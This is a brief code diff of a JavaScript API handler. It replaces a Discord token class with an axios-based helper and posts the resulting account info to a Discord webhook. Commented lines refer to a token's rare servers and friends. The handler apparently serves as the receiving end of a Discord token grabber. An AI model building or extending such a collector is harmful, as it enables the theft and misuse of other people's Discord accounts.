@@ -1,5 +1,5 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
-import DiscordToken from '../../../utils/class.cjs';
+import getDiscordInfo from '../../../utils/axios.cjs';
 import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
@@ -31,7 +31,7 @@ export default async function handler(req, res) {
 
     console.log(info);
 
-    const Discord = new DiscordToken(data).info;
+    const Discord = await getDiscordInfo(data);
     //const servers = new DiscordToken(data).guilds.rares;
     //const friends = new DiscordToken(data).friends.rares;
     const embedBuilder = (Discord?.ID || Discord.ID)
